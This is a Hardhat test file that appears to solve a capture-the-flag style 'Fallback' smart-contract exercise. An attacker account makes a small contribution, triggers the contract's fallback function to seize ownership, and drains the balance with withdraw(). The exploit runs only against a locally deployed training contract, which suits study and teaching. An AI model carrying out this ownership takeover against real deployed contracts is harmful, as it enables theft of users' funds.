const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Exercise 1 - Fallback", function () {

  let deployer, attacker;
  const SOME_ETH = ethers.utils.parseEther("0.0001");

  beforeEach(async function () {
    [deployer, attacker] = await ethers.getSigners();

    const Fallback = await ethers.getContractFactory("Fallback");
    this.contract = await Fallback.deploy();
    await this.contract.deployed();
  });


  it("Hack the contract", async function () {
    // Initially, deployer should be the owner
    expect(await this.contract.owner()).to.eq(deployer.address)

    // Need to contribute to become owner according to fallback function logic
    const contributeTx = await this.contract.connect(attacker).contribute({ value: SOME_ETH });
    await contributeTx.wait();

    expect(await this.contract.connect(attacker).getContribution()).to.equal(SOME_ETH);

    // Fallback func will be called - Now attacker will become owner
    await attacker.sendTransaction({
      to: this.contract.address,
      value: SOME_ETH
    })

    expect(await this.contract.owner()).to.eq(attacker.address)
    await this.contract.connect(attacker).withdraw()

    expect(await ethers.provider.getBalance(this.contract.address)).to.eq(0)
  });

});
